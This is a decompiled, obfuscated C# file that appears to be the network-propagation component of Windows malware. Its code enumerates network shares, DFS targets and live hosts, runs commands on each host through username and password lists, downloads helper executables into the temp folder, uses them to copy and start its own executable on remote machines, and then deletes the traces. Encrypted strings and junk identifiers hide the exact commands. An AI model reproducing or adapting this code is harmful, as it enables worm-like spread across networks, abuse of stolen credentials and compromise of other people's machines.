using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace EJhaxGWLzpBbb;

internal sealed class dgstxCCDzAUD
{
	public sealed class NObvmGaWlXbr
	{
		private string _003CServerName_003Ek__BackingField;

		public string ServerName
		{
			get
			{
				return _003CServerName_003Ek__BackingField;
			}
			set
			{
				_003CServerName_003Ek__BackingField = value;
			}
		}
	}

	public enum lasAakqUlsu
	{
		NckhjViJbXxFE = 1,
		MSjtgJzzYFUVqU,
		JYFlmWvMAp,
		iGsubQuNWi,
		uspBjvzFsAl
	}

	public enum jwNztBYkHZ
	{
		qjqpeabpDbV,
		DshvpunFzWv,
		hwBCjdjeKa,
		kAMrcFyiTDah
	}

	public enum pkfyLLHbpRVd
	{
		vjAdDChJXsMZY = 1,
		nSeXtDVvBVWbV = 2,
		hgOIcbZcroNKABR = 4,
		TPjlgFlkZooHD = 8,
		AmaTCJBeMEvY = 16,
		xfoLvydXYL = 19
	}

	public enum wqcfzNGCqt
	{
		syHpVzRaejoruODVw,
		fBgqhlDvOtAieE,
		vzUochedyVfaYA,
		hultEGnQAHMqZo,
		WdXPjCGJeqiKy,
		lNAEByiYNFz,
		JogjeDOamEUsLWw,
		MrcVxaCQwONhXjD,
		hOiaPNdLbYtr,
		ZfsQozOlMSP,
		wLizITjsQK,
		mGftknXqQSNU
	}

	public sealed class HXUhnTWrRPoFQ : IEnumerable
	{
		private enum OCiZdGxCacmpGmz
		{
			quRvLGZQJAgmmc = 0,
			IavvAFlOMo = 259
		}

		[StructLayout(LayoutKind.Sequential)]
		private sealed class RhIZhMNIIQt
		{
			public lasAakqUlsu IMHYHlGUDV;

			public jwNztBYkHZ uBVJQfnaXyzoPW;

			public wqcfzNGCqt ddROaXPzxpzKsaEl;

			public pkfyLLHbpRVd tEMmoFrUhfY;

			public string xFjmQMwtcCi;

			public string oRdypLYZvhw;

			public string YsLAfJphXLA;

			public string mWnLRDKYAXLUb;
		}

		private ArrayList wGaKLmTCETbA = new ArrayList();

		[DllImport("Mpr.dll")]
		private static extern OCiZdGxCacmpGmz WNetOpenEnumA(lasAakqUlsu dwScope, jwNztBYkHZ dwType, pkfyLLHbpRVd dwUsage, RhIZhMNIIQt p, out IntPtr lphEnum);

		[DllImport("Mpr.dll")]
		private static extern OCiZdGxCacmpGmz WNetCloseEnum(IntPtr intptr_0);

		[DllImport("Mpr.dll")]
		private static extern OCiZdGxCacmpGmz WNetEnumResourceA(IntPtr intptr_0, ref uint uint_0, IntPtr intptr_1, ref uint uint_1);

		private void EnumerateServers(RhIZhMNIIQt rhIZhMNIIQt_0, lasAakqUlsu lasAakqUlsu_0, jwNztBYkHZ jwNztBYkHZ_0, pkfyLLHbpRVd pkfyLLHbpRVd_0, wqcfzNGCqt wqcfzNGCqt_0)
		{
			uint uint_ = 16384u;
			IntPtr intPtr = Marshal.AllocHGlobal(16384);
			IntPtr lphEnum = IntPtr.Zero;
			uint uint_2 = 1u;
			if (WNetOpenEnumA(lasAakqUlsu_0, jwNztBYkHZ_0, pkfyLLHbpRVd_0, rhIZhMNIIQt_0, out lphEnum) == OCiZdGxCacmpGmz.quRvLGZQJAgmmc)
			{
				OCiZdGxCacmpGmz oCiZdGxCacmpGmz;
				do
				{
					oCiZdGxCacmpGmz = WNetEnumResourceA(lphEnum, ref uint_2, intPtr, ref uint_);
					switch (oCiZdGxCacmpGmz)
					{
					case OCiZdGxCacmpGmz.IavvAFlOMo:
						continue;
					case OCiZdGxCacmpGmz.quRvLGZQJAgmmc:
						Marshal.PtrToStructure(intPtr, rhIZhMNIIQt_0);
						if (rhIZhMNIIQt_0.ddROaXPzxpzKsaEl == wqcfzNGCqt_0)
						{
							wGaKLmTCETbA.Add(rhIZhMNIIQt_0.oRdypLYZvhw);
						}
						if ((rhIZhMNIIQt_0.tEMmoFrUhfY & pkfyLLHbpRVd.nSeXtDVvBVWbV) == pkfyLLHbpRVd.nSeXtDVvBVWbV)
						{
							EnumerateServers(rhIZhMNIIQt_0, lasAakqUlsu_0, jwNztBYkHZ_0, pkfyLLHbpRVd_0, wqcfzNGCqt_0);
						}
						continue;
					}
					break;
				}
				while (oCiZdGxCacmpGmz != OCiZdGxCacmpGmz.IavvAFlOMo);
				WNetCloseEnum(lphEnum);
			}
			Marshal.FreeHGlobal(intPtr);
		}

		public HXUhnTWrRPoFQ(lasAakqUlsu lasAakqUlsu_0, jwNztBYkHZ jwNztBYkHZ_0, pkfyLLHbpRVd pkfyLLHbpRVd_0, wqcfzNGCqt wqcfzNGCqt_0)
		{
			RhIZhMNIIQt rhIZhMNIIQt_ = new RhIZhMNIIQt();
			EnumerateServers(rhIZhMNIIQt_, lasAakqUlsu_0, jwNztBYkHZ_0, pkfyLLHbpRVd_0, wqcfzNGCqt_0);
		}

		public IEnumerator GetEnumerator()
		{
			return wGaKLmTCETbA.GetEnumerator();
		}
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct ElfmLARhlBYe
	{
		[MarshalAs(UnmanagedType.LPWStr)]
		public string xoxgDubnQFdo;

		[MarshalAs(UnmanagedType.LPWStr)]
		public string JJWruMJEhCfpW;

		public uint PpPVKwQZBLyXc;

		public uint rxoRPkxFyIQy;

		public IntPtr PoGAvaqJAziHmPK;
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct uKLktKtPbiT
	{
		public int PpPVKwQZBLyXc;

		[MarshalAs(UnmanagedType.LPWStr)]
		public string gWMXSXwgxnsYsJq;

		[MarshalAs(UnmanagedType.LPWStr)]
		public string YagzWhqmGOBfWF;
	}

	public struct kouWFHIHIDkq
	{
		public string TZAYUYMwrQJ;

		public string[] kMyxSbLmNNd;

		public kouWFHIHIDkq(string string_0, string[] string_1)
		{
			TZAYUYMwrQJ = string_0;
			kMyxSbLmNNd = string_1;
		}
	}

	private sealed class foXtCbHnPum
	{
		public string BdnfEpCeegVM;

		public string TWLQMJsFWzXYxCp;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CRun_003Eb__1(string string_0)
		{
			if ((!string_0.StartsWith(getString_0(107087137)) && !string_0.StartsWith(getString_0(107087100)) && !string_0.StartsWith(getString_0(107087091)) && !string_0.Contains(getString_0(107088069))) || !buJIpKRUrvga(string_0))
			{
				return;
			}
			try
			{
				if (hiKoLLubGHH.XTLwWuXHos == getString_0(107397006))
				{
					for (int i = 0; i < OPQbuwfYhp.Count; i++)
					{
						hiKoLLubGHH.DndsNVaSUbaYiXt(getString_0(107087213), getString_0(107087110) + string_0 + getString_0(107199621) + OPQbuwfYhp[i] + getString_0(107087159) + ACBeKEAlkFu[i]);
						Thread.Sleep(1000);
					}
				}
				else
				{
					hiKoLLubGHH.DndsNVaSUbaYiXt(getString_0(107087213), getString_0(107087110) + string_0);
					Thread.Sleep(1000);
				}
			}
			catch
			{
			}
			if (hiKoLLubGHH.XTLwWuXHos == getString_0(107397006))
			{
				for (int j = 0; j < OPQbuwfYhp.Count; j++)
				{
					if (hiKoLLubGHH.AxeGoYXMvgRYQ)
					{
						if (File.Exists(BdnfEpCeegVM))
						{
							hiKoLLubGHH.DndsNVaSUbaYiXt(BdnfEpCeegVM, getString_0(107087128) + string_0 + getString_0(107198734) + OPQbuwfYhp[j] + getString_0(107198725) + ACBeKEAlkFu[j] + getString_0(107198684) + Assembly.GetEntryAssembly()!.Location + getString_0(107087448));
						}
					}
					else if (File.Exists(TWLQMJsFWzXYxCp))
					{
						hiKoLLubGHH.DndsNVaSUbaYiXt(TWLQMJsFWzXYxCp, getString_0(107087128) + string_0 + getString_0(107198734) + OPQbuwfYhp[j] + getString_0(107198725) + ACBeKEAlkFu[j] + getString_0(107199163) + Assembly.GetEntryAssembly()!.Location + getString_0(107087448));
					}
				}
			}
			else if (hiKoLLubGHH.AxeGoYXMvgRYQ)
			{
				if (File.Exists(BdnfEpCeegVM))
				{
					hiKoLLubGHH.DndsNVaSUbaYiXt(BdnfEpCeegVM, getString_0(107087128) + string_0 + getString_0(107199138) + Assembly.GetEntryAssembly()!.Location + getString_0(107087448));
				}
			}
			else if (File.Exists(TWLQMJsFWzXYxCp))
			{
				hiKoLLubGHH.DndsNVaSUbaYiXt(TWLQMJsFWzXYxCp, getString_0(107087128) + string_0 + getString_0(107199105) + Assembly.GetEntryAssembly()!.Location + getString_0(107087448));
			}
		}

		static foXtCbHnPum()
		{
			Strings.CreateGetStringDelegate(typeof(foXtCbHnPum));
		}
	}

	private sealed class IQKLNQPSprihi
	{
		public string veODPfPIhcImMY;

		public bool _003CGetIPAddresses_003Eb__5(string string_0)
		{
			return string_0 != veODPfPIhcImMY;
		}
	}

	public static List<string> kGaXSQVnsw;

	public static string vbQLJcsRfMmp;

	public static List<string> OPQbuwfYhp;

	public static List<string> ACBeKEAlkFu;

	public static List<string> WqzpMoDbVtsCK;

	[NonSerialized]
	internal static GetString getString_0;

	public static List<NObvmGaWlXbr> oGOsggjwypPbgB()
	{
		try
		{
			Process process = new Process();
			process.StartInfo.FileName = getString_0(107396802);
			process.StartInfo.Arguments = getString_0(107199208);
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.RedirectStandardOutput = true;
			process.Start();
			List<NObvmGaWlXbr> list = new List<NObvmGaWlXbr>();
			while (true)
			{
				if (!process.StandardOutput.EndOfStream)
				{
					string text = process.StandardOutput.ReadLine();
					if (text == getString_0(107199159))
					{
						break;
					}
					if (text != string.Empty && text[0] == '\\' && text[1] == '\\')
					{
						StringBuilder stringBuilder = new StringBuilder();
						for (int i = 2; i < text.Length && text[i] != ' '; i++)
						{
							stringBuilder.Append(text[i]);
						}
						list.Add(new NObvmGaWlXbr
						{
							ServerName = getString_0(107396839) + stringBuilder.ToString() + getString_0(107087023)
						});
					}
					continue;
				}
				process.WaitForExit();
				process.Close();
				return list;
			}
			return null;
		}
		catch
		{
			return null;
		}
	}

	[DllImport("Netapi32.dll", CharSet = CharSet.Auto)]
	public static extern int NetDfsEnum([MarshalAs(UnmanagedType.LPWStr)] string sugOfXMIInXvd, int lpbqRujjeZj, int dzJOgEeLAQ, out IntPtr QoTxlfhhhoWKx, [MarshalAs(UnmanagedType.I4)] out int aoJLlnMYKyilG, [MarshalAs(UnmanagedType.I4)] ref int MgGUETyaLNUVn);

	public static List<kouWFHIHIDkq> KNNVrHCtSKhTYprhn(string string_0)
	{
		try
		{
			List<kouWFHIHIDkq> list = new List<kouWFHIHIDkq>();
			IntPtr QoTxlfhhhoWKx = default(IntPtr);
			int aoJLlnMYKyilG = 0;
			int MgGUETyaLNUVn = 0;
			if (NetDfsEnum(string_0, 3, 268435455, out QoTxlfhhhoWKx, out aoJLlnMYKyilG, ref MgGUETyaLNUVn) == 0)
			{
				for (int i = 0; i < aoJLlnMYKyilG; i++)
				{
					ElfmLARhlBYe elfmLARhlBYe = (ElfmLARhlBYe)Marshal.PtrToStructure(QoTxlfhhhoWKx + i * Marshal.SizeOf(typeof(ElfmLARhlBYe)), typeof(ElfmLARhlBYe));
					if (elfmLARhlBYe.xoxgDubnQFdo == string_0)
					{
						continue;
					}
					List<string> list2 = new List<string>();
					for (int j = 0; j < elfmLARhlBYe.rxoRPkxFyIQy; j++)
					{
						IntPtr ptr = new IntPtr(elfmLARhlBYe.PoGAvaqJAziHmPK.ToInt64() + j * Marshal.SizeOf(typeof(uKLktKtPbiT)));
						uKLktKtPbiT uKLktKtPbiT = (uKLktKtPbiT)Marshal.PtrToStructure(ptr, typeof(uKLktKtPbiT));
						if (uKLktKtPbiT.PpPVKwQZBLyXc == 2)
						{
							list2.Add(Path.Combine(new string[3]
							{
								getString_0(107087071),
								uKLktKtPbiT.gWMXSXwgxnsYsJq,
								uKLktKtPbiT.YagzWhqmGOBfWF
							}));
						}
					}
					string text = elfmLARhlBYe.xoxgDubnQFdo.Replace(string_0, getString_0(107088012));
					if (text.StartsWith(getString_0(107396839)))
					{
						text = text.Substring(1);
					}
					list.Add(new kouWFHIHIDkq(text, list2.ToArray()));
				}
			}
			return list;
		}
		catch (Exception)
		{
			return null;
		}
	}

	public static void ihHGaTQUJHvFN()
	{
		hiKoLLubGHH.KoKFpIzICEddc(getString_0(107199146));
		List<NObvmGaWlXbr> list = oGOsggjwypPbgB();
		List<kouWFHIHIDkq> list2 = KNNVrHCtSKhTYprhn(Environment.MachineName);
		if (list2 != null)
		{
			foreach (kouWFHIHIDkq item in list2)
			{
				string[] kMyxSbLmNNd = item.kMyxSbLmNNd;
				foreach (string text in kMyxSbLmNNd)
				{
					if (text.Contains(Environment.MachineName))
					{
						continue;
					}
					try
					{
						if (hiKoLLubGHH.XTLwWuXHos == getString_0(107396949))
						{
							for (int j = 0; j < OPQbuwfYhp.Count; j++)
							{
								hiKoLLubGHH.DndsNVaSUbaYiXt(getString_0(107087156), getString_0(107199573) + text + getString_0(107199564) + OPQbuwfYhp[j] + getString_0(107087102) + ACBeKEAlkFu[j]);
							}
						}
						else
						{
							hiKoLLubGHH.DndsNVaSUbaYiXt(getString_0(107087156), getString_0(107199573) + text);
						}
						hiKoLLubGHH.JPTwqHSqmQofk.Add(text.Replace(getString_0(107087066), getString_0(107088012)));
					}
					catch
					{
					}
				}
			}
		}
		if (list == null)
		{
			return;
		}
		foreach (NObvmGaWlXbr item2 in list)
		{
			if (item2.ServerName.Contains(Environment.MachineName))
			{
				continue;
			}
			try
			{
				if (hiKoLLubGHH.XTLwWuXHos == getString_0(107396949))
				{
					for (int k = 0; k < OPQbuwfYhp.Count; k++)
					{
						hiKoLLubGHH.DndsNVaSUbaYiXt(getString_0(107087156), getString_0(107199573) + item2.ServerName + getString_0(107199564) + OPQbuwfYhp[k] + getString_0(107087102) + ACBeKEAlkFu[k]);
					}
				}
				else
				{
					hiKoLLubGHH.DndsNVaSUbaYiXt(getString_0(107087156), getString_0(107199573) + item2.ServerName);
				}
				hiKoLLubGHH.JPTwqHSqmQofk.Add(item2.ServerName.Replace(getString_0(107087066), getString_0(107088012)));
			}
			catch
			{
			}
		}
	}

	public static void WVjvADIUMQdIdWV()
	{
		foXtCbHnPum CS_0024_003C_003E8__locals0 = new foXtCbHnPum();
		hiKoLLubGHH.slfmJnHyNG();
		List<KEPmidMuhlGh> list = KEPmidMuhlGh.cdryZkpkyOlj();
		foreach (KEPmidMuhlGh item in list)
		{
			kGaXSQVnsw.Add(item.IPAddress);
		}
		CS_0024_003C_003E8__locals0.BdnfEpCeegVM = getString_0(107088012);
		CS_0024_003C_003E8__locals0.TWLQMJsFWzXYxCp = getString_0(107088012);
		try
		{
			CS_0024_003C_003E8__locals0.BdnfEpCeegVM = fiRAwVDBCHYx();
		}
		catch
		{
		}
		try
		{
			CS_0024_003C_003E8__locals0.TWLQMJsFWzXYxCp = EngYDQLAFkvopR();
		}
		catch
		{
		}
		foreach (KEPmidMuhlGh item2 in list)
		{
			try
			{
				if (item2.IPAddress.StartsWith(getString_0(107087080)) || item2.IPAddress.StartsWith(getString_0(107087043)) || item2.IPAddress.StartsWith(getString_0(107087034)) || item2.IPAddress.Contains(getString_0(107088012)))
				{
					mStcPDhBFr.NVTQZxUZjYZZd(item2.MacAddress, item2.IPAddress, getString_0(107199519));
				}
			}
			catch
			{
			}
		}
		try
		{
			Parallel.ForEach(kGaXSQVnsw, delegate(string string_0)
			{
				if ((string_0.StartsWith(foXtCbHnPum.getString_0(107087137)) || string_0.StartsWith(foXtCbHnPum.getString_0(107087100)) || string_0.StartsWith(foXtCbHnPum.getString_0(107087091)) || string_0.Contains(foXtCbHnPum.getString_0(107088069))) && buJIpKRUrvga(string_0))
				{
					try
					{
						if (hiKoLLubGHH.XTLwWuXHos == foXtCbHnPum.getString_0(107397006))
						{
							for (int i = 0; i < OPQbuwfYhp.Count; i++)
							{
								hiKoLLubGHH.DndsNVaSUbaYiXt(foXtCbHnPum.getString_0(107087213), foXtCbHnPum.getString_0(107087110) + string_0 + foXtCbHnPum.getString_0(107199621) + OPQbuwfYhp[i] + foXtCbHnPum.getString_0(107087159) + ACBeKEAlkFu[i]);
								Thread.Sleep(1000);
							}
						}
						else
						{
							hiKoLLubGHH.DndsNVaSUbaYiXt(foXtCbHnPum.getString_0(107087213), foXtCbHnPum.getString_0(107087110) + string_0);
							Thread.Sleep(1000);
						}
					}
					catch
					{
					}
					if (hiKoLLubGHH.XTLwWuXHos == foXtCbHnPum.getString_0(107397006))
					{
						for (int j = 0; j < OPQbuwfYhp.Count; j++)
						{
							if (hiKoLLubGHH.AxeGoYXMvgRYQ)
							{
								if (File.Exists(CS_0024_003C_003E8__locals0.BdnfEpCeegVM))
								{
									hiKoLLubGHH.DndsNVaSUbaYiXt(CS_0024_003C_003E8__locals0.BdnfEpCeegVM, foXtCbHnPum.getString_0(107087128) + string_0 + foXtCbHnPum.getString_0(107198734) + OPQbuwfYhp[j] + foXtCbHnPum.getString_0(107198725) + ACBeKEAlkFu[j] + foXtCbHnPum.getString_0(107198684) + Assembly.GetEntryAssembly()!.Location + foXtCbHnPum.getString_0(107087448));
								}
							}
							else if (File.Exists(CS_0024_003C_003E8__locals0.TWLQMJsFWzXYxCp))
							{
								hiKoLLubGHH.DndsNVaSUbaYiXt(CS_0024_003C_003E8__locals0.TWLQMJsFWzXYxCp, foXtCbHnPum.getString_0(107087128) + string_0 + foXtCbHnPum.getString_0(107198734) + OPQbuwfYhp[j] + foXtCbHnPum.getString_0(107198725) + ACBeKEAlkFu[j] + foXtCbHnPum.getString_0(107199163) + Assembly.GetEntryAssembly()!.Location + foXtCbHnPum.getString_0(107087448));
							}
						}
					}
					else if (hiKoLLubGHH.AxeGoYXMvgRYQ)
					{
						if (File.Exists(CS_0024_003C_003E8__locals0.BdnfEpCeegVM))
						{
							hiKoLLubGHH.DndsNVaSUbaYiXt(CS_0024_003C_003E8__locals0.BdnfEpCeegVM, foXtCbHnPum.getString_0(107087128) + string_0 + foXtCbHnPum.getString_0(107199138) + Assembly.GetEntryAssembly()!.Location + foXtCbHnPum.getString_0(107087448));
						}
					}
					else if (File.Exists(CS_0024_003C_003E8__locals0.TWLQMJsFWzXYxCp))
					{
						hiKoLLubGHH.DndsNVaSUbaYiXt(CS_0024_003C_003E8__locals0.TWLQMJsFWzXYxCp, foXtCbHnPum.getString_0(107087128) + string_0 + foXtCbHnPum.getString_0(107199105) + Assembly.GetEntryAssembly()!.Location + foXtCbHnPum.getString_0(107087448));
					}
				}
			});
		}
		catch
		{
			return;
		}
		try
		{
			if (File.Exists(CS_0024_003C_003E8__locals0.BdnfEpCeegVM))
			{
				File.Delete(CS_0024_003C_003E8__locals0.BdnfEpCeegVM);
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (File.Exists(CS_0024_003C_003E8__locals0.TWLQMJsFWzXYxCp))
			{
				File.Delete(CS_0024_003C_003E8__locals0.TWLQMJsFWzXYxCp);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string fiRAwVDBCHYx()
	{
		if (IntPtr.Size == 8)
		{
			return uzOzSdiNDtwrdTS(new Uri(hiKoLLubGHH.ZszvXPTYjBtgjF(getString_0(107199530))));
		}
		return uzOzSdiNDtwrdTS(new Uri(hiKoLLubGHH.ZszvXPTYjBtgjF(getString_0(107199530))));
	}

	public static string EngYDQLAFkvopR()
	{
		if (IntPtr.Size == 8)
		{
			return uzOzSdiNDtwrdTS(new Uri(hiKoLLubGHH.ZszvXPTYjBtgjF(getString_0(107199417))));
		}
		return uzOzSdiNDtwrdTS(new Uri(hiKoLLubGHH.ZszvXPTYjBtgjF(getString_0(107198860))));
	}

	public static bool buJIpKRUrvga(string string_0)
	{
		bool result = false;
		Ping ping = null;
		try
		{
			using (ping = new Ping())
			{
				PingReply pingReply = ping.Send(string_0);
				result = pingReply.Status == IPStatus.Success;
				return result;
			}
		}
		catch (PingException)
		{
			return result;
		}
		finally
		{
			ping?.Dispose();
		}
	}

	public static string uzOzSdiNDtwrdTS(Uri uri_0)
	{
		string path = Path.GetRandomFileName().Replace(getString_0(107198755), getString_0(107088012)).Remove(0, 3) + getString_0(107198750);
		WebClient webClient = new WebClient();
		webClient.DownloadFile(uri_0, Path.Combine(Path.GetTempPath(), path));
		return Path.Combine(Path.GetTempPath(), path);
	}

	public static List<string> znWCJngjZA()
	{
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_001d: Expected O, but got Unknown
		//IL_0036: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		string[] array = null;
		try
		{
			ArrayList arrayList = new ArrayList();
			ManagementObjectSearcher val = new ManagementObjectSearcher(getString_0(107198773));
			ManagementObjectCollection val2 = val.Get();
			ManagementObjectEnumerator enumerator = val2.GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					ManagementObject val3 = (ManagementObject)enumerator.get_Current();
					if ((bool)((ManagementBaseObject)val3).get_Item(getString_0(107198708)))
					{
						string[] array2 = (string[])((ManagementBaseObject)val3).get_Item(getString_0(107198695));
						string[] array3 = array2;
						foreach (string value in array3)
						{
							arrayList.Add(value);
						}
					}
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			if (arrayList.Count > 0)
			{
				array = new string[arrayList.Count];
				arrayList.CopyTo(array);
			}
			else
			{
				array = new string[0];
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (array == null)
			{
				return null;
			}
			string[] array4 = array;
			for (int j = 0; j < array4.Length; j++)
			{
				IQKLNQPSprihi CS_0024_003C_003E8__locals0 = new IQKLNQPSprihi();
				CS_0024_003C_003E8__locals0.veODPfPIhcImMY = array4[j];
				if (CS_0024_003C_003E8__locals0.veODPfPIhcImMY.Contains(getString_0(107198650)))
				{
					array = array.Where((string string_0) => string_0 != CS_0024_003C_003E8__locals0.veODPfPIhcImMY).ToArray();
				}
			}
			return array.ToList();
		}
		catch
		{
			return null;
		}
	}

	static dgstxCCDzAUD()
	{
		Strings.CreateGetStringDelegate(typeof(dgstxCCDzAUD));
		kGaXSQVnsw = new List<string>();
		vbQLJcsRfMmp = getString_0(107088012);
		OPQbuwfYhp = new List<string>();
		ACBeKEAlkFu = new List<string>();
		WqzpMoDbVtsCK = new List<string>();
	}
}
